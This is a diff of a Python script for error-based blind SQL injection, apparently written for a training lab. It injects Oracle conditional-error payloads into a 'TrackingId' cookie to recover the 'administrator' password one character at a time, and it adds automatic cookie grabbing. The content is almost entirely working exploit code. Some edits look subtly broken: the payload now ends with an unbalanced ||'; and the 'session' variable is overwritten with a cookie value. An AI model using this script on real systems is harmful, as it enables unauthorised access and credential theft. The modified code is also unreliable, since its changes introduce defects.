@@ -14,11 +14,11 @@
 #   way to brute-force the password of the user 'administrator'.                                                                                          #
 #                                                                                                                                                         #
 # Changes:                                                                                                                                                #
-#   1. Defined `TRACKINGID` and `SESSION` as constants at the top of the script.                                                                          #
-#   2. Remove proxies.                                                                                                                                    #
-#   3. Created and used alphanumeric lists directly instead of using ASCII representations and then converting them to alphanumeric.                      #
-#   4. Used simplified payload.                                                                                                                           #
-#   5. Added comments throughout the code.
+#   1. Remove proxies.                                                                                                                                    #
+#   2. Created and used alphanumeric lists directly instead of using ASCII representations and then converting them to alphanumeric.                      #
+#   3. Used simplified payload.                                                                                                                           #
+#   4. Automated cookie grabbing.                                                                                                                         #
+#   5. Added comments throughout the code.                                                                                                                #
 #---------------------------------------------------------------------------------------------------------------------------------------------------------#
 
 import sys
@@ -27,14 +27,11 @@ import urllib3
 import urllib.parse
 import string
 
-TRACKINGID = '6nnuLIKDZOVP96qK' ## CHANGE THIS
-SESSION = 'hepG20Q8JMtN58OrTMNfcjKY5qev5mE4' ## CHANGE THIS
-
 # disable certificate-related warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # create a list with all lowercase alphabetic characters
-alpha_list = [i for i in string.printable]
+alpha_list = [i for i in string.ascii_lowercase]
 # create a list with numeric characters
 num_list = [str(i) for i in range(10)]
 # combine the two lists
@@ -47,13 +44,20 @@ def sqli_password(url):
         # try every character from our character list
         for j in char_list:
             # define the payload to be injected
-            sqli_payload = f"' || (select TO_CHAR(1/0) FROM users WHERE username='administrator' and SUBSTR(password,{i},1)='{j}')||'"
+            sqli_payload = f"' || (select TO_CHAR(1/0) FROM users WHERE username='administrator' and SUBSTR(password,{i},1)='{j}')||';"
             # URL encode the payload
             sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+            
+            # get the cookies of the HTTP GET request
+            session = requests.Session()
+            response = session.get(url)
+            TrackingId = session.cookies.values()[0]
+            session = session.cookies.values()[1]
+            
             # inject the payload to the 'TrackingId' value
-            cookies = {'TrackingId' : TRACKINGID + sqli_payload_encoded,
+            cookies = {'TrackingId' : TrackingId + sqli_payload_encoded,
                        # set the session cookie
-                       'session' : SESSION}
+                       'session' : session}
             # define the HTTP GET request
             r = requests.get(
                 # the URL to make the GET request to
